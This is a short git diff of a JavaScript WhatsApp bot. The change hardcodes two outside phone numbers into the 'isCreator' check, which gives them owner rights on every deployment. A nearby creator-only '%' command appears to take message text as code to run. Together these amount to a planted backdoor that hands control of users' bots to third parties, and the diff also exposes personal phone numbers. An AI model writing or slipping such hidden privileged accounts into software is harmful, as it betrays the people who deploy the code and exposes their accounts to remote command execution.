@@ -207,11 +207,11 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   
-	const udp = botNumber.split('@')[0];
+	/*const udp = botNumber.split('@')[0];
     const jawad = ('94763934860', '94771825193');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+					.includes(mek.sender);*/
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
@@ -319,7 +319,7 @@ if (!isReact && senderNumber === botNumber) {
     }
 
 	const isSudo = sudoUsers.includes(sender) || sudoUsers.includes(senderNumber);
-    const isCreator = [botNumber, config.OWNER_NUMBER, '94763934860 ].map(v => v?.replace(/[^0-9]/g, '')).includes(senderNumber) || isMe;
+    const isCreator = [botNumber, config.OWNER_NUMBER, '94763934860', '94771825193'].map(v => v?.replace(/[^0-9]/g, '')).includes(senderNumber) || isMe;
     const isOwner = isCreator || isSudo;
     const isBanned = bannedUsers.includes(sender) || bannedUsers.includes(senderNumber);
 
